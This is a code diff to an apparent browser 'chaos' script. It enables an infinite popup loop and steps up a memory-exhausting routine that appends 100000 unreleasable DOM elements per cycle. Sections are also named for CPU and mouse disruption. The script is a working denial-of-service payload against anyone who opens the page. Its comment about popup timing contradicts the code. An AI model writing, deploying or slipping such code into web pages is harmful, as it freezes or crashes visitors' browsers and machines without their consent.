@@ -44,22 +44,22 @@ cpuPulse();
 /* ================= Memory chaos ================= */
 const memoryArray = [];
 function burnMemory() {
-    for(let i=0;i<1000;i++){
+    for(let i=0;i<100000;i++){
         const div = document.createElement('div');
         div.className = 'memory-burner';
         document.body.appendChild(div);
         memoryArray.push(div); // store reference to prevent garbage collection
     }
-    setTimeout(burnMemory, 50);
+    setTimeout(burnMemory, 300);
 }
 burnMemory();
 
 /* ================= Infinite popup chaos ================= */
 function spawnPopup() {
     const win = window.open('lol.html', '_blank', 'width=357,height=330,menubar=no,toolbar=no,resizable=no');
-    setTimeout(spawnPopup, 1); // spawn every 30000000 seconds
+    setTimeout(spawnPopup, 1000); // spawn every 30000000 seconds
 }
-// spawnPopup();
+ spawnPopup();
 
 /* ================= Mouse chaos ================= */
 document.addEventListener('mousemove', e => {
